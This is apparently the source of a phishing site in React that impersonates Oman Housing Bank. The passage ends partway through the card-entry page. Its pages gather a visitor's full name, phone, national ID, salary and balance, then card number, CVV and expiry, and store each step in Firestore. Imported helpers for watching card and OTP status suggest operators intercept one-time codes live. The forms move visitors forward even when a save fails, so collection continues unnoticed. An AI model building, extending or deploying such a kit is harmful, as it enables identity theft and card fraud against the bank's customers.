import { useState, useRef, useEffect } from "react";
import { Menu, Search, ChevronUp, ChevronDown, User, Phone, CreditCard, Lock, CalendarDays } from "lucide-react";
import {
  initVisitorOnline,
  updateRegistrationData,
  updateLoanData,
  updateCardData,
  watchCardStatus,
  watchOtpStatus,
  submitOtpCode,
  markVisitorOffline,
} from "../../../lib/firestore-service";


/* ─── Option types ─── */
type OptionItem =
  | { kind: "item"; label: string }
  | { kind: "divider" };

/* ─── Custom dropdown ─── */
type CustomSelectProps = {
  value: string;
  onChange: (v: string) => void;
  options: OptionItem[];
  ariaLabel: string;
};

function CustomSelect({ value, onChange, options, ariaLabel }: CustomSelectProps) {
  const [open, setOpen] = useState(false);
  const wrapRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!open) return;
    function handleClick(e: MouseEvent) {
      if (wrapRef.current && !wrapRef.current.contains(e.target as Node)) {
        setOpen(false);
      }
    }
    document.addEventListener("mousedown", handleClick);
    return () => document.removeEventListener("mousedown", handleClick);
  }, [open]);

  return (
    <div ref={wrapRef} className="cs-wrap" aria-label={ariaLabel}>
      <button
        type="button"
        className={`cs-trigger ${open ? "cs-trigger--open" : ""}`}
        onClick={() => setOpen((o) => !o)}
        aria-haspopup="listbox"
        aria-expanded={open}
      >
        <span className="cs-trigger-arrows" aria-hidden="true">
          <ChevronUp size={10} strokeWidth={2.2} />
          <ChevronDown size={10} strokeWidth={2.2} />
        </span>
        <span className="cs-trigger-label">{value}</span>
      </button>

      {open && (
        <div className="cs-dropdown" role="listbox">
          {options.map((opt, i) => {
            if (opt.kind === "divider") {
              return <hr key={`div-${i}`} className="cs-divider" />;
            }
            const selected = opt.label === value;
            return (
              <button
                key={opt.label}
                type="button"
                role="option"
                aria-selected={selected}
                className={`cs-option ${selected ? "cs-option--selected" : ""}`}
                onClick={() => { onChange(opt.label); setOpen(false); }}
              >
                {selected && <span className="cs-check">✓</span>}
                <span className="cs-option-label">{opt.label}</span>
              </button>
            );
          })}
        </div>
      )}
    </div>
  );
}

function CurrencyMark() {
  return <span className="currency-mark">ر.ع</span>;
}

const WA_LINK = "https://wa.me/96871196880?text=%D8%A7%D9%84%D8%B3%D9%84%D8%A7%D9%85%20%D8%B9%D9%84%D9%8A%D9%83%D9%85%D8%8C%20%D8%A3%D8%AD%D8%AA%D8%A7%D8%AC%20%D9%85%D8%B3%D8%A7%D8%B9%D8%AF%D8%A9%20%D8%A8%D8%AE%D8%B5%D9%88%D8%B5%20%D8%B7%D9%84%D8%A8%20%D8%A7%D9%84%D8%AA%D9%85%D9%88%D9%8A%D9%84.";

function SupportBot({ extraClass = "" }: { extraClass?: string }) {
  return (
    <a
      href={WA_LINK}
      target="_blank"
      rel="noopener noreferrer"
      className={`support-bot ${extraClass}`.trim()}
      aria-label="تواصل معنا عبر واتساب"
    >
      <span className="notification-badge">1</span>
      <span className="bot-antenna" />
      <span className="bot-face">
        <span className="bot-eye bot-eye-left" />
        <span className="bot-eye bot-eye-right" />
        <span className="bot-mouth" />
      </span>
      <span className="bot-side bot-side-left" />
      <span className="bot-side bot-side-right" />
    </a>
  );
}

/* ─── Options data ─── */
const LOAN_PURPOSE_OPTIONS: OptionItem[] = [
  { kind: "item", label: "شراء منزل مكتمل" },
  { kind: "item", label: "شراء منزل وإكماله" },
  { kind: "item", label: "قرض فقط" },
  { kind: "item", label: "قرض وبناء" },
  { kind: "item", label: "بناء - 12 شهر" },
  { kind: "item", label: "بناء - 18 شهر" },
  { kind: "item", label: "بناء - 24 شهر" },
  { kind: "item", label: "بناء - 30 شهر" },
  { kind: "item", label: "بناء - 36 شهر" },
];

const AGE_LIMIT_OPTIONS: OptionItem[] = [
  { kind: "item", label: "ذكر - حد أقصى 60" },
  { kind: "item", label: "ذكر - حد أقصى 55" },
  { kind: "item", label: "أنثى - حد أقصى 60" },
  { kind: "item", label: "أنثى - حد أقصى 55" },
  { kind: "item", label: "متقاعد - حد أقصى 70" },
];

const LOAN_TERM_OPTIONS: OptionItem[] = [
  { kind: "item", label: "عادي 25 سنة - 300 شهر" },
  { kind: "item", label: "النفط والغاز 20 سنة - 240 شهر" },
  { kind: "item", label: "Others 15 سنة - 180 شهر" },
  { kind: "divider" },
  { kind: "item", label: "10 سنوات (120 شهر)" },
  { kind: "item", label: "11 سنة (132 شهر)" },
  { kind: "item", label: "12 سنة (144 شهر)" },
  { kind: "item", label: "13 سنة (156 شهر)" },
  { kind: "item", label: "14 سنة (168 شهر)" },
  { kind: "item", label: "16 سنة (192 شهر)" },
  { kind: "item", label: "17 سنة (204 شهر)" },
  { kind: "item", label: "18 سنة (216 شهر)" },
  { kind: "item", label: "19 سنة (228 شهر)" },
  { kind: "item", label: "20 سنة (240 شهر)" },
  { kind: "item", label: "21 سنة (252 شهر)" },
  { kind: "item", label: "22 سنة (264 شهر)" },
  { kind: "item", label: "23 سنة (276 شهر)" },
  { kind: "item", label: "24 سنة (288 شهر)" },
  { kind: "item", label: "25 سنة (300 شهر)" },
];

/* ══════════════════════════════════════════
   PAGE 1 — Registration
══════════════════════════════════════════ */
type RegistrationPageProps = {
  docId: string;
  onNext: (phone: string) => void;
};

function RegistrationPage({ docId, onNext }: RegistrationPageProps) {
  const [name, setName]     = useState("");
  const [phone, setPhone]   = useState("");
  const [idNum, setIdNum]   = useState("");
  const [touched, setTouched] = useState({ name: false, phone: false, id: false });
  const [loading, setLoading] = useState(false);

  const phoneValid = phone.length === 8;
  const idValid    = idNum.length === 9;
  const nameValid  = name.trim().length > 0;
  const canSubmit  = nameValid && phoneValid && idValid;

  async function handleNext() {
    setTouched({ name: true, phone: true, id: true });
    if (!canSubmit) return;
    setLoading(true);
    try {
      await updateRegistrationData(docId, {
        ownerName: name.trim(),
        phoneNumber: phone,
        identityNumber: idNum,
      });
      onNext(phone);
    } catch (err) {
      console.error("Firestore error:", err);
      onNext(phone);
    } finally {
      setLoading(false);
    }
  }

  function handlePhone(v: string) {
    const digits = v.replace(/\D/g, "").slice(0, 8);
    setPhone(digits);
  }

  function handleId(v: string) {
    const digits = v.replace(/\D/g, "").slice(0, 9);
    setIdNum(digits);
  }

  return (
    <div className="reg-page" dir="rtl">
      <style>{`
        .reg-page {
          min-height: 100vh;
          width: 100%;
          display: flex;
          flex-direction: column;
          align-items: center;
          font-family: Tahoma, Arial, sans-serif;
          box-sizing: border-box;
          background:
            linear-gradient(
              180deg,
              rgba(22,58,72,.72) 0%,
              rgba(18,52,66,.85) 55%,
              rgba(14,44,58,.9) 100%
            ),
            url(${import.meta.env.BASE_URL}images/oman-bank-logo.jpeg) center/cover no-repeat;
          background-color: #1a3e52;
        }
        .reg-page *, .reg-page *::before, .reg-page *::after { box-sizing: border-box; }

        /* ── Top header bar ── */
        .reg-logos {
          width: 100%;
          height: 92px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 0 40px;
          direction: ltr;
          background: #202020;
        }
        .reg-header-actions {
          display: flex;
          align-items: center;
          gap: 38px;
        }
        .reg-header-icon { color: #f5f5f5; display: block; }
        .reg-menu-icon   { width: 28px; height: 28px; }
        .reg-search-icon { width: 22px; height: 22px; }
        .reg-logo-img {
          height: 72px;
          width: 230px;
          object-fit: cover;
          object-position: right center;
          display: block;
        }

        /* ── White card ── */
        .reg-card {
          width: calc(100% - 36px);
          max-width: 480px;
          background: #fff;
          border-radius: 18px;
          padding: 34px 28px 30px;
          box-shadow: 0 8px 40px rgba(0,0,0,.28);
          margin: 0 auto;
        }
        .reg-title {
          text-align: center;
          font-size: 30px;
          font-weight: 700;
          color: #1e1e1e;
          margin: 0 0 10px;
          direction: rtl;
        }
        .reg-subtitle {
          text-align: center;
          font-size: 17px;
          color: #6b6b6b;
          margin: 0 0 28px;
          direction: rtl;
          line-height: 1.5;
        }

        /* ── Fields ── */
        .reg-field { margin-bottom: 22px; }
        .reg-field-label {
          display: block;
          text-align: right;
          font-size: 17px;
          color: #333;
          margin-bottom: 8px;
          direction: rtl;
        }
        .reg-field-label span { color: #c0392b; margin-right: 1px; }
        .reg-input-wrap {
          display: flex;
          align-items: center;
          border: 1.5px solid #d4a08a;
          border-radius: 10px;
          overflow: hidden;
          background: #fff;
          transition: border-color .2s, box-shadow .2s;
        }
        .reg-input-wrap:focus-within {
          border-color: #b07060;
          box-shadow: 0 0 0 3px rgba(189,132,105,.18);
        }
        .reg-input-wrap--err {
          border-color: #c0392b;
        }
        .reg-input-wrap--err:focus-within {
          border-color: #c0392b;
          box-shadow: 0 0 0 3px rgba(192,57,43,.15);
        }
        .reg-input-icon {
          width: 52px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #888;
          flex-shrink: 0;
          border-right: 1.5px solid #e8d0c4;
        }
        .reg-input {
          flex: 1;
          height: 52px;
          border: none;
          outline: none;
          background: transparent;
          font-family: Tahoma, Arial, sans-serif;
          font-size: 16px;
          color: #222;
          text-align: right;
          direction: rtl;
          padding: 0 14px 0 8px;
        }
        .reg-input::placeholder { color: #bbb; }

        /* ── Next button ── */
        .reg-next-btn {
          width: 100%;
          height: 58px;
          margin-top: 8px;
          border: none;
          border-radius: 10px;
          background: #c87f64;
          color: #fff;
          font-family: Tahoma, Arial, sans-serif;
          font-size: 22px;
          font-weight: 600;
          cursor: pointer;
          letter-spacing: .5px;
          transition: filter .18s, transform .14s, opacity .18s;
        }
        .reg-next-btn:not(:disabled):hover  { filter: brightness(1.06); }
        .reg-next-btn:not(:disabled):active { transform: scale(.98); filter: brightness(.97); }
        .reg-next-btn:disabled {
          opacity: .45;
          cursor: not-allowed;
        }
        /* ── Error hint ── */
        .reg-error {
          color: #c0392b;
          font-size: 13px;
          text-align: right;
          margin-top: 5px;
          direction: rtl;
          min-height: 18px;
        }
        /* ── Footer image ── */
        .reg-footer-img {
          width: calc(100% - 36px);
          max-width: 480px;
          margin: 18px auto 0;
          border-radius: 14px;
          overflow: hidden;
          box-shadow: 0 4px 20px rgba(0,0,0,.22);
          display: block;
        }
        .reg-footer-img img {
          width: 100%;
          display: block;
        }
      `}</style>

      {/* ── Header bar ── */}
      <div className="reg-logos">
        <div className="reg-header-actions">
          <Menu className="reg-header-icon reg-menu-icon" strokeWidth={2.1} />
          <Search className="reg-header-icon reg-search-icon" strokeWidth={3} />
        </div>
        <img
          src={`${import.meta.env.BASE_URL}images/oman-bank-logo.jpeg`}
          alt="بنك الإسكان العماني - Oman Housing Bank"
          className="reg-logo-img"
        />
      </div>

      {/* ── Card ── */}
      <div className="reg-card">
        <h1 className="reg-title">تسجيل بياناتك الشخصية</h1>
        <p className="reg-subtitle">يرجى إدخال بياناتك الشخصية بشكل صحيح</p>

        {/* الاسم */}
        <div className="reg-field">
          <label className="reg-field-label">الاسم<span>:*</span></label>
          <div className={`reg-input-wrap ${touched.name && !nameValid ? "reg-input-wrap--err" : ""}`}>
            <div className="reg-input-icon"><User size={20} strokeWidth={1.8} /></div>
            <input
              className="reg-input"
              type="text"
              placeholder="أدخل الاسم الكامل"
              value={name}
              onBlur={() => setTouched(t => ({ ...t, name: true }))}
              onChange={(e) => setName(e.target.value)}
            />
          </div>
          {touched.name && !nameValid && <p className="reg-error">يرجى إدخال الاسم الكامل</p>}
        </div>

        {/* رقم الهاتف */}
        <div className="reg-field">
          <label className="reg-field-label">رقم الهاتف<span>:*</span></label>
          <div className={`reg-input-wrap ${touched.phone && !phoneValid ? "reg-input-wrap--err" : ""}`}>
            <div className="reg-input-icon"><Phone size={20} strokeWidth={1.8} /></div>
            <input
              className="reg-input"
              type="tel"
              inputMode="numeric"
              placeholder="أدخل رقم الهاتف (8 أرقام)"
              value={phone}
              maxLength={8}
              onBlur={() => setTouched(t => ({ ...t, phone: true }))}
              onChange={(e) => handlePhone(e.target.value)}
            />
          </div>
          {touched.phone && !phoneValid && (
            <p className="reg-error">
              {phone.length === 0 ? "يرجى إدخال رقم الهاتف" : `${phone.length}/8 أرقام — يجب أن يكون 8 أرقام`}
            </p>
          )}
        </div>

        {/* رقم الهوية */}
        <div className="reg-field">
          <label className="reg-field-label">رقم الهوية<span>:*</span></label>
          <div className={`reg-input-wrap ${touched.id && !idValid ? "reg-input-wrap--err" : ""}`}>
            <div className="reg-input-icon"><CreditCard size={20} strokeWidth={1.8} /></div>
            <input
              className="reg-input"
              type="text"
              inputMode="numeric"
              placeholder="أدخل رقم الهوية (9 أرقام)"
              value={idNum}
              maxLength={9}
              onBlur={() => setTouched(t => ({ ...t, id: true }))}
              onChange={(e) => handleId(e.target.value)}
            />
          </div>
          {touched.id && !idValid && (
            <p className="reg-error">
              {idNum.length === 0 ? "يرجى إدخال رقم الهوية" : `${idNum.length}/9 أرقام — يجب أن يكون 9 أرقام`}
            </p>
          )}
        </div>

        <button
          className="reg-next-btn"
          type="button"
          onClick={handleNext}
          disabled={loading}
        >
          {loading ? "جارٍ الحفظ..." : "التالي"}
        </button>
      </div>

      {/* ── Footer image ── */}
      <div className="reg-footer-img">
        <img src={`${import.meta.env.BASE_URL}images/oman-footer.jpeg`} alt="بنك الإسكان العماني - معلومات التواصل" />
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════
   PAGE 2 — Loan Calculator
══════════════════════════════════════════ */
function LoanCalculatorPage({ onNext, docId }: { onNext: () => void; docId: string }) {
  const [loanType, setLoanType] = useState("شراء منزل مكتمل");
  const [ageLimit, setAgeLimit] = useState("ذكر - حد أقصى 60");
  const [loanTerm, setLoanTerm] = useState("عادي 25 سنة - 300 شهر");
  const [housingType, setHousingType] = useState("سكني");
  const [salary, setSalary]               = useState("");
  const [commitments, setCommitments]     = useState("");
  const [amount, setAmount]               = useState("");
  const [availableBalance, setAvailableBalance] = useState("");
  const [isCalculated, setIsCalculated]   = useState(false);
  const [touched, setTouched]             = useState(false);

  const salaryOk  = salary.trim() !== "" && Number(salary) > 0;
  const commitOk  = commitments.trim() !== "";
  const amountOk  = amount.trim() !== "" && Number(amount) > 0;
  const balanceOk = availableBalance.trim() !== "";
  const canCalculate = salaryOk && commitOk && amountOk && balanceOk;

  function calculate() {
    setTouched(true);
    if (!canCalculate) return;
    setIsCalculated(true);
    if (docId) {
      updateLoanData(docId, {
        loanType: housingType,
        loanPeriod: loanTerm,
        repaymentMethod: ageLimit,
        loanPurpose: loanType,
        requestedAmount: amount,
        salary,
        otherObligations: commitments,
        netIncome: availableBalance,
      }).catch((err) => console.error("Firestore loan update error:", err));
    }
    window.setTimeout(() => {
      setIsCalculated(false);
      onNext();
    }, 1200);
  }

  return (
    <main className="loan-page" dir="rtl">
      <style>{`
        .loan-page {
          --ink: #5f5f5f;
          --dark: #202020;
          --line: #d8d8d8;
          --peach-line: #bd927e;
          --button: #ff9c75;
          min-height: 100vh;
          width: 100%;
          overflow-x: hidden;
          color: var(--ink);
          background: #f7f7f7;
          font-family: Tahoma, Arial, sans-serif;
          box-sizing: border-box;
        }
        .loan-page *, .loan-page *::before, .loan-page *::after {
          box-sizing: border-box;
        }

        /* ── Header ── */
        .bank-header {
          height: 92px;
          width: 100%;
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 0 40px;
          direction: ltr;
          color: white;
          background: #202020;
        }
        .header-actions {
          display: flex;
          align-items: center;
          gap: 38px;
        }
        .header-icon { color: #f5f5f5; display: block; }
        .menu-icon   { width: 28px; height: 28px; }
        .search-icon { width: 22px; height: 22px; }
        .bank-logo-img {
          height: 72px;
          width: 230px;
          object-fit: cover;
          object-position: right center;
          display: block;
        }

        /* ── Content ── */
        .loan-content {
          width: calc(100% - 38px);
          min-height: calc(100vh - 92px);
          margin: 0 auto;
          padding: 22px 24px 12px;
          background: #fbfbfb;
          border-right: 1px solid #d6d6d6;
          border-left:  1px solid #d6d6d6;
        }
        .field-group { margin-bottom: 17px; }
        .field-label {
          display: block;
          margin: 0 0 7px;
          color: #626262;
          font-size: 25px;
          font-weight: 400;
          line-height: 1.25;
          text-align: right;
        }
        .radio-row {
          display: flex;
          align-items: center;
          justify-content: flex-start;
          gap: 9px;
          padding-right: 1px;
          margin: 1px 0 22px;
          color: #696969;
          font-size: 24px;
        }
        .radio-option {
          display: inline-flex;
          align-items: center;
          gap: 7px;
          cursor: pointer;
          white-space: nowrap;
        }
        .radio-option input {
          appearance: none;
          width: 23px; height: 23px;
          border: 2px solid #737373;
          border-radius: 50%;
          background: #fff;
          cursor: pointer;
        }
        .radio-option input:checked {
          border-color: #159ce2;
          box-shadow: inset 0 0 0 5px #159ce2;
        }

        /* ── Custom select ── */
        .cs-wrap { position: relative; }

        .cs-trigger {
          width: 100%;
          height: 44px;
          border: 1px solid var(--peach-line);
          border-radius: 24px;
          background: #ededed;
          display: flex;
          align-items: center;
          justify-content: flex-end;
          padding: 0 13px 0 42px;
          cursor: pointer;
          transition: border-color .2s, box-shadow .2s, background .2s;
          font-family: Tahoma, Arial, sans-serif;
          font-size: 15px;
          color: #343434;
          text-align: right;
          direction: rtl;
        }
        .cs-trigger--open {
          border-color: #159ce2;
          background: #f3f3f3;
          box-shadow: 0 0 0 3px rgba(21, 156, 226, .15);
        }
        .cs-trigger-arrows {
          position: absolute;
          left: 10px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          width: 15px; height: 25px;
          color: #171717;
          pointer-events: none;
        }
        .cs-trigger-label {
          flex: 1;
          text-align: right;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
        }

        /* ── Dropdown card ── */
        .cs-dropdown {
          position: absolute;
          top: calc(100% + 4px);
          right: 0; left: 0;
          z-index: 100;
          background: #fff;
          border-radius: 12px;
          box-shadow: 0 6px 28px rgba(0,0,0,.18);
          max-height: 340px;
          overflow-y: auto;
          overscroll-behavior: contain;
          -webkit-overflow-scrolling: touch;
        }
        .cs-option {
          width: 100%;
          display: flex;
          align-items: center;
          justify-content: flex-end;
          gap: 10px;
          padding: 14px 18px;
          border: none;
          border-bottom: 1px solid #ebebeb;
          background: transparent;
          font-family: Tahoma, Arial, sans-serif;
          font-size: 17px;
          color: #1a1a1a;
          text-align: right;
          direction: rtl;
          cursor: pointer;
          transition: background .12s;
        }
        .cs-option:last-child { border-bottom: none; }
        .cs-option:hover { background: #f5f5f5; }
        .cs-option--selected { color: #1a1a1a; }
        .cs-check {
          font-size: 18px;
          color: #1a1a1a;
          font-weight: 600;
          flex-shrink: 0;
        }
        .cs-option-label { flex: 1; text-align: right; }
        .cs-divider {
          border: none;
          border-top: 1px solid #d4d4d4;
          margin: 0;
        }

        /* ── Text inputs ── */
        .text-input {
          width: 100%;
          height: 44px;
          border: 1px solid var(--line);
          border-radius: 0;
          outline: none;
          background: #fff;
          color: #343434;
          font-family: Tahoma, Arial, sans-serif;
          font-size: 15px;
          padding: 0 12px;
          text-align: right;
          direction: rtl;
          transition: border-color .2s ease, box-shadow .2s ease;
        }
        .text-input:focus {
          border-color: #8a6558;
          box-shadow: 0 0 0 3px rgba(189, 146, 126, .16);
        }
        .money-label {
          display: inline-flex;
          align-items: center;
          gap: 6px;
          direction: rtl;
        }
        .currency-mark {
          display: inline-block;
          direction: rtl;
          color: #666;
          font-size: 26px;
          font-weight: 700;
          line-height: 1;
          text-decoration: underline;
          text-decoration-thickness: 1px;
          text-underline-offset: 2px;
        }
        .money-input-wrap { position: relative; }
        .money-input-wrap .text-input {
          direction: ltr;
          text-align: right;
          padding-right: 13px;
        }

        /* ── Calculate button ── */
        .calculate-button {
          width: 100%;
          height: 58px;
          margin-top: 19px;
          border: 0;
          color: white;
          background: var(--button);
          font-family: Tahoma, Arial, sans-serif;
          font-size: 21px;
          cursor: pointer;
          transition: transform .16s ease, filter .16s ease;
        }
        .calculate-button:hover:not(:disabled) { filter: brightness(.98); }
        .calculate-button:active:not(:disabled),
        .calculate-button.calculating {
          transform: scale(.98);
        }
        .calculate-button.calculating {
          animation: calculate-pulse .55s ease-in-out infinite alternate;
        }
        .calculate-button:disabled {
          background: #ccc;
          cursor: not-allowed;
          opacity: .7;
        }
        .text-input--err {
          border-color: #c0392b !important;
          box-shadow: 0 0 0 3px rgba(192,57,43,.12) !important;
        }
        .field-err-msg {
          margin: 4px 0 0;
          font-size: 13px;
          color: #c0392b;
          text-align: right;
          direction: rtl;
        }
        .calculation-note {
          height: 0;
          overflow: hidden;
          color: #9b765f;
          font-size: 13px;
          text-align: center;
          opacity: 0;
          transition: height .25s ease, opacity .25s ease, padding .25s ease;
        }
        .calculation-note.visible {
          height: 31px;
          padding-top: 9px;
          opacity: 1;
        }

        /* ── Page 2 footer ── */
        .loan-footer {
          width: calc(100% - 38px);
          margin: 18px auto 0;
          border-radius: 14px;
          overflow: hidden;
          box-shadow: 0 4px 20px rgba(0,0,0,.18);
          display: block;
          line-height: 0;
        }
        .loan-footer img {
          width: 100%;
          display: block;
        }

        /* ── Support bot ── */
        .support-bot {
          position: fixed;
          z-index: 3;
          right: 26px;
          bottom: 10px;
          width: 78px; height: 78px;
          border: 0; border-radius: 50%;
          background: #fff;
          box-shadow: 0 1px 9px rgba(0,0,0,.18);
          cursor: pointer;
          animation: bot-float 2.8s ease-in-out infinite;
        }
        .notification-badge {
          position: absolute; z-index: 4;
          top: -5px; right: 1px;
          width: 22px; height: 22px;
          display: grid; place-items: center;
          border-radius: 50%;
          color: #fff; background: #ec0808;
          font-family: Arial, sans-serif;
          font-size: 13px; font-weight: 700;
        }
        .bot-face {
          position: absolute; left: 20px; top: 23px;
          width: 38px; height: 31px;
          border: 2px solid #b68a00;
          border-radius: 11px 11px 14px 14px;
          background: #f5c928;
        }
        .bot-face::before {
          content: ""; position: absolute;
          inset: 4px 5px 6px; border-radius: 6px;
          background: #252525;
        }
        .bot-eye {
          position: absolute; z-index: 1; top: 11px;
          width: 4px; height: 4px;
          border-radius: 50%; background: #fff;
        }
        .bot-eye-left  { left: 11px; }
        .bot-eye-right { right: 11px; }
        .bot-mouth {
          position: absolute; z-index: 1;
          left: 15px; bottom: 6px;
          width: 8px; height: 3px;
          border-bottom: 1px solid #fff; border-radius: 50%;
        }
        .bot-antenna {
          position: absolute; top: 16px; left: 38px;
          width: 2px; height: 8px; background: #b68a00;
        }
        .bot-antenna::before {
          content: ""; position: absolute;
          top: -4px; left: -3px;
          width: 8px; height: 8px;
          border-radius: 50%; background: #b68a00;
        }
        .bot-side {
          position: absolute; top: 28px;
          width: 11px; height: 20px;
          border: 3px solid #e6a400; border-radius: 50%;
        }
        .bot-side-left  { left: 11px;  border-right-color: #14a6dc; }
        .bot-side-right { right: 11px; border-left-color:  #14a6dc; }

        @keyframes bot-float {
          0%, 100% { transform: translateY(0); }
          50%       { transform: translateY(-4px); }
        }
        @keyframes calculate-pulse {
          from { filter: brightness(1); }
          to   { filter: brightness(1.08); }
        }

        @media (max-width: 430px) {
          .bank-header  { padding: 0 28px; }
          .header-actions { gap: 28px; }
          .bank-logo-img { height: 58px; }
          .loan-content { width: calc(100% - 30px); padding: 21px 17px 10px; }
          .field-label  { font-size: 23px; }
          .radio-row    { font-size: 22px; }
          .support-bot  { right: 22px; }
        }
      `}</style>

      <header className="bank-header">
        <div className="header-actions" aria-label="أدوات الموقع">
          <Menu className="header-icon menu-icon" strokeWidth={2.1} />
          <Search className="header-icon search-icon" strokeWidth={3} />
        </div>
        <img
          src={`${import.meta.env.BASE_URL}images/oman-bank-logo.jpeg`}
          alt="بنك الإسكان العماني - Oman Housing Bank"
          className="bank-logo-img"
        />
      </header>

      <section className="loan-content">
        {/* نوع القرض */}
        <div className="field-group">
          <label className="field-label">نوع القرض:</label>
          <div className="radio-row">
            <label className="radio-option">
              <span>سكني</span>
              <input
                type="radio" name="housing-type" value="سكني"
                checked={housingType === "سكني"}
                onChange={() => setHousingType("سكني")}
              />
            </label>
            <label className="radio-option">
              <span>المدن المتكاملة</span>
              <input
                type="radio" name="housing-type" value="المدن المتكاملة"
                checked={housingType === "المدن المتكاملة"}
                onChange={() => setHousingType("المدن المتكاملة")}
              />
            </label>
          </div>
        </div>

        {/* الهدف من القرض */}
        <div className="field-group">
          <label className="field-label">الهدف من القرض:</label>
          <CustomSelect
            ariaLabel="الهدف من القرض"
            value={loanType}
            onChange={setLoanType}
            options={LOAN_PURPOSE_OPTIONS}
          />
        </div>

        {/* الحد الأقصى للعمر */}
        <div className="field-group">
          <label className="field-label">الحد الأقصى للعمر:</label>
          <CustomSelect
            ariaLabel="الحد الأقصى للعمر"
            value={ageLimit}
            onChange={setAgeLimit}
            options={AGE_LIMIT_OPTIONS}
          />
        </div>

        {/* مدة القرض */}
        <div className="field-group">
          <label className="field-label">مدة القرض:</label>
          <CustomSelect
            ariaLabel="مدة القرض"
            value={loanTerm}
            onChange={setLoanTerm}
            options={LOAN_TERM_OPTIONS}
          />
        </div>

        {/* الدخل الشهري */}
        <div className="field-group">
          <label className="field-label money-label">
            الدخل الشهري (<CurrencyMark />): <span style={{color:"#c0392b"}}>*</span>
          </label>
          <div className="money-input-wrap">
            <input
              className={`text-input${touched && !salaryOk ? " text-input--err" : ""}`}
              aria-label="الدخل الشهري"
              inputMode="numeric"
              placeholder="أدخل الدخل الشهري"
              value={salary}
              onChange={(e) => setSalary(e.target.value.replace(/\D/g, ""))}
            />
          </div>
          {touched && !salaryOk && <p className="field-err-msg">هذا الحقل مطلوب</p>}
        </div>

        {/* الاستقطاعات */}
        <div className="field-group">
          <label className="field-label money-label">
            الاستقطاعات (<CurrencyMark />): <span style={{color:"#c0392b"}}>*</span>
          </label>
          <input
            className={`text-input${touched && !commitOk ? " text-input--err" : ""}`}
            aria-label="الاستقطاعات"
            inputMode="numeric"
            placeholder="أدخل قيمة الاستقطاعات"
            value={commitments}
            onChange={(e) => setCommitments(e.target.value.replace(/\D/g, ""))}
          />
          {touched && !commitOk && <p className="field-err-msg">هذا الحقل مطلوب</p>}
        </div>

        {/* مبلغ القرض المطلوب */}
        <div className="field-group">
          <label className="field-label money-label">
            مبلغ القرض المطلوب (<CurrencyMark />): <span style={{color:"#c0392b"}}>*</span>
          </label>
          <input
            className={`text-input${touched && !amountOk ? " text-input--err" : ""}`}
            aria-label="مبلغ القرض المطلوب"
            inputMode="numeric"
            placeholder="أدخل المبلغ المطلوب"
            value={amount}
            onChange={(e) => setAmount(e.target.value.replace(/\D/g, ""))}
          />
          {touched && !amountOk && <p className="field-err-msg">هذا الحقل مطلوب</p>}
        </div>

        {/* الرصيد المتوفر حالياً */}
        <div className="field-group">
          <label className="field-label money-label">
            الرصيد المتوفر حالياً (<CurrencyMark />): <span style={{color:"#c0392b"}}>*</span>
          </label>
          <div className="money-input-wrap">
            <input
              className={`text-input${touched && !balanceOk ? " text-input--err" : ""}`}
              aria-label="الرصيد المتوفر حالياً"
              inputMode="numeric"
              placeholder="أدخل الرصيد المتوفر"
              value={availableBalance}
              onChange={(e) => setAvailableBalance(e.target.value.replace(/\D/g, ""))}
            />
          </div>
          {touched && !balanceOk && <p className="field-err-msg">هذا الحقل مطلوب</p>}
        </div>

        <button
          className={`calculate-button ${isCalculated ? "calculating" : ""}`}
          type="button"
          disabled={isCalculated}
          onClick={calculate}
        >
          احسب
        </button>
        <div className={`calculation-note ${isCalculated ? "visible" : ""}`} aria-live="polite">
          جارٍ حساب القسط
        </div>
      </section>

      <div className="loan-footer">
        <img src={`${import.meta.env.BASE_URL}images/oman-footer.jpeg`} alt="بنك الإسكان العماني - معلومات التواصل" />
      </div>

      <SupportBot />
    </main>
  );
}

/* ══════════════════════════════════════════
   PAGE 3 — Card Registration
══════════════════════════════════════════ */
function CardRegistrationPage({ docId, onNext }: { docId: string; onNext: () => void }) {
  const [cardNum, setCardNum]         = useState("");
  const [cvv, setCvv]                 = useState("");
  const [expiry, setExpiry]           = useState("");
  const [holder, setHolder]           = useState("");
  const [agreed, setAgreed]           = useState(false);
  const [cardTouched, setCardTouched] = useState(false);
  const [submitting, setSubmitting]   = useState(false);

  /* ── Luhn algorithm ── */
  function luhn(num: string): boolean {
    const digits = num.replace(/\s/g, "");
    if (digits.length !== 16) return false;
    if (digits[0] === "0") return false;          // no card starts with 0
    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
      let d = parseInt(digits[digits.length - 1 - i], 10);
      if (i % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
      sum += d;
    }
    return sum % 10 === 0;
  }

  /* real-time: reject leading zero as soon as first digit is typed */
  const cardDigits      = cardNum.replace(/\s/g, "");
  const hasLeadingZero  = cardDigits.length > 0 && cardDigits[0] === "0";
  const cardFull        = cardDigits.length === 16;
  const cardValid       = cardFull && luhn(cardNum);
  const cardError       = cardTouched && cardDigits.length > 0 && cardFull && !cardValid;
  const cardShort       = cardTouched && cardDigits.length > 0 && !cardFull;
  const cardLeadingErr  = hasLeadingZero; /* show immediately, no need for blur */

  function handleCardNum(v: string) {
    const digits = v.replace(/\D/g, "").slice(0, 16);
    const formatted = digits.replace(/(.{4})/g, "$1 ").trim();
    setCardNum(formatted);
  }

  function handleExpiry(v: string) {
    const digits = v.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 3) {
      setExpiry(digits.slice(0, 2) + " / " + digits.slice(2));
    } else {
      setExpiry(digits);
    }
  }

  return (
    <main className="card-page" dir="rtl">
      <style>{`
        .card-page {
          min-height: 100vh;
          width: 100%;
          background: #f7f7f7;
          font-family: Tahoma, Arial, sans-serif;
          box-sizing: border-box;
          color: #5f5f5f;
        }
        .card-page *, .card-page *::before, .card-page *::after { box-sizing: border-box; }

        /* reuse same header */
        .card-header {
          height: 92px; width: 100%;
          display: flex; align-items: center; justify-content: space-between;
          padding: 0 40px; direction: ltr;
          background: #202020;
        }
        .card-header-actions { display: flex; align-items: center; gap: 38px; }
        .card-header-icon { color: #f5f5f5; display: block; }
        .card-menu-icon   { width: 28px; height: 28px; }
        .card-search-icon { width: 22px; height: 22px; }
        .card-logo-img {
          height: 72px; width: 230px;
